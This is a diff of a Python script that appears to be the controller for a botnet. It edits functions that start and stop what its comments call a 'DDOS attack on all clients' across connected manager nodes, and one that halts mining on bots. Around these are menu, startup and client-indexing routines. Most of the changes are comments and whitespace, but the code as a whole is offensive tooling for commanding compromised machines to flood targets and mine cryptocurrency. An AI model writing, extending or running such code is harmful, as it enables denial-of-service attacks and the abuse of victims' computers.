@@ -15,7 +15,7 @@ clients_indexed = False
 
 
 def ping_host(addr, port):
-    #DDOS tool
+    #start DDOS attack on all clients
     if clients_indexed == True:
         manager_count = 0
         for i, manager in enumerate(manager_objects):
@@ -26,11 +26,13 @@ def ping_host(addr, port):
         print('All clients need to be indexed')
 
 def stop_ping():
+    #stop DDOS attack on all clients
     if clients_indexed == True:
         manager_count = 0
         for i, manager in enumerate(manager_objects):
             manager.stop_ping()
             manager_count += 1
+            
 def stop_all_miners():
     #send command to all managers to stop mining on bots
     if clients_indexed == True:
@@ -131,10 +133,6 @@ def manager_handler(addr, index):
                             else:
                                 break
                             time.sleep(1)
-                            
-                            
-                        
-                    
                 else:
                     print('Invalid Command.')
                     continue
@@ -152,9 +150,6 @@ def manage(addr):
             break
             menu()
             
-    
-
-
 def startup():
     #startup sequence: connect to all managers and index all clients
     global status
@@ -216,9 +211,7 @@ def menu():
               
             else:
                 print('[ERROR] Not connected to managers')
-                
                     
-                
         elif inp == '4':
             #manager menu loop
             
@@ -252,12 +245,9 @@ def menu():
                 
         elif inp == '5':
             if status == 'Connected':
-                os.system('cls')
-                
-                
+                os.system('cls')     
             else:
                 print('[ERROR] Not connected to managers')
-
         else:
             print('Invalid Input.\n')
             time.sleep(2)
